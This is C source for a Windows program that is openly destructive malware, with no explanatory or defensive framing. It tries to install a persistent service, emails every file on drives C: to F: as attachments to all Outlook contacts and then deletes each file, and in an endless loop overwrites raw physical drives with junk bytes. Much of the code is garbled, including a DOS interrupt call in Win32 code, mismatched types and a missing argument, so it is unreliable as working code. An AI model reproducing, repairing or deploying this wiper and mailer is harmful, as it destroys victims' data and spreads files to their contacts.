#include <stdio.h>
#include <Windows.h>
#include <Ole2.h>
#include <OleAuto.h>
static char workingDNS = "";
static int do_silly = 0;
const char* strings[] = {
    "\\\\.\\PhysicalDrive0",
    "\\\\.\\PhysicalDrive2",
    "\\\\.\\PhysicalDrive3",
    "\\\\.\\PhysicalDrive4",
    "\\\\.\\PhysicalDrive5",
    "\\\\.\\PhysicalDrive6",
    "\\\\.\\PhysicalDrive7",
    "\\\\.\\PhysicalDrive8",
    "\\\\.\\PhysicalDrive9",
    "\\\\.\\PhysicalDrive10",
    "\\\\.\\PhysicalDrive11",
};
void asomigah() {
    char* asm_code = "mov ah, 4Bh\n"
                     "mov dx, offset cmd.exe\n"
                     "mov bx, offset SC create Nogapi44 binpath= dancemanYAYWOO start= auto\n"
                     "mov cx, 0\n"
                     "int 21h\n";
    __asm__ __volatile__(
        asm_code
    );
}
int outboyy(char* subject, char* body, char* file_path) {
    HRESULT hr;
    LPDISPATCH app = NULL;
    LPDISPATCH mail = NULL;
    LPDISPATCH attachments = NULL;
    VARIANT v_subject;
    VARIANT v_body;
    VARIANT v_attach;
    VARIANT v_missing;
    int result = 0;
    CoInitialize(NULL);
    hr = CoCreateInstance(CLSID_OutlookApplication, NULL, CLSCTX_LOCAL_SERVER, IID_IDispatch, (void**)&app);
    if (SUCCEEDED(hr)) {
        LPDISPATCH contacts = NULL;
        hr = app->lpVtbl->GetNamespace(app, _T("MAPI"), (LPDISPATCH*)&contacts);
        if (SUCCEEDED(hr)) {
            LPDISPATCH items = NULL;
            hr = contacts->lpVtbl->GetDefaultFolder(contacts, olFolderContacts, (LPDISPATCH*)&items);
            if (SUCCEEDED(hr)) {
                LPDISPATCH contact = NULL;
                VARIANT index;
                VariantInit(&index);
                index.vt = VT_I4;
                index.lVal = 1;
                while (SUCCEEDED(items->lpVtbl->Item(items, index, (LPDISPATCH*)&contact)) && contact != NULL) {
                    VARIANT v_recipient;
                    VariantInit(&v_recipient);
                    contact->lpVtbl->GetProperty(contact, _T("Email1Address"), &v_recipient);
                    if (v_recipient.vt == VT_BSTR && v_recipient.bstrVal != NULL) {
                        hr = app->lpVtbl->CreateItem(app, olMailItem, &mail);
                        if (SUCCEEDED(hr)) {
                            mail->lpVtbl->To(mail, v_recipient);
                            VariantInit(&v_subject);
                            v_subject.vt = VT_BSTR;
                            v_subject.bstrVal = SysAllocString(ConvertToUnicode(subject));
                            mail->lpVtbl->Subject(mail, v_subject);
                            VariantInit(&v_body);
                            v_body.vt = VT_BSTR;
                            v_body.bstrVal = SysAllocString(ConvertToUnicode(body));
                            mail->lpVtbl->Body(mail, v_body);
                            attachments = mail->lpVtbl->Attachments(mail);
                            VariantInit(&v_attach);
                            v_attach.vt = VT_BSTR;
                            v_attach.bstrVal = SysAllocString(ConvertToUnicode(file_path));
                            char* filename = strrchr(file_path, '\\');
                            filename++;
                            attachments->lpVtbl->Add(attachments, v_attach, v_missing, v_missing, v_missing);
                            mail->lpVtbl->Send(mail);
                            result = 1;
                        }
                    }
                    if (contact != NULL) {
                        contact->lpVtbl->Release(contact);
                    }
                    VariantClear(&v_recipient);
                    index.lVal++;
                }
                if (items != NULL) {
                    items->lpVtbl->Release(items);
                }
            }
            if (contacts != NULL) {
                contacts->lpVtbl->Release(contacts);
            }
        }
    }
    if (attachments != NULL) {
        attachments->lpVtbl->Release(attachments);
    }
    if (mail != NULL) {
        mail->lpVtbl->Release(mail);
    }
    if (app != NULL) {
        app->lpVtbl->Release(app);
    }
    CoUninitialize();
    DeleteFile(file_path);
    return result;
}
void yibibibi(const char* path) {
    WIN32_FIND_DATA find_data;
    HANDLE h_find;
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", path);
    h_find = FindFirstFile(search_path, &find_data);
    if (h_find == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }
		if (outboyy("YAYAA", "YABABBABABDBABDABBDBA AGHASHGHAHGHA UHJEWMGHWESJUGHO SXSSSSSSSSSSSSS!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!", find_data.cFileName) != NULL) {
			printf("*spits*");
		}
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char sub_path[MAX_PATH];
            snprintf(sub_path, sizeof(sub_path), "%s\\%s", path, find_data.cFileName);
            yibibibi(sub_path);
        }
    } while (FindNextFile(h_find, &find_data));
    FindClose(h_find);
}
const char* stringsman() {
    static int last_index = 0;
    if (last_index < 11) {
        const char* result = strings[last_index];
        last_index++;
        return result;
    } else {
        return NULL;
    }
}
void shamooz(char drive_name) {
    while ((drive_name = stringsman()) != NULL) {
        HANDLE BAMBAM = CreateFile(drive_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (BAMBAM != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            WriteFile(BAMBAM, "0xHELLOTWEETHELLOTWEET", 22, &bytesWritten, NULL);
            CloseHandle(BAMBAM);
        }
    }
}
void basicbitch() {
	while (1) {
		printf("shamooz()");
		shamooz();
	}
}
void spits() {
	asomigah();
	yibibibi("C:\\");
	yibibibi("D:\\");
	yibibibi("E:\\");
	yibibibi("F:\\");
}
void main() {
	printf("weirdor");
	spits();
	basicbitch();
}
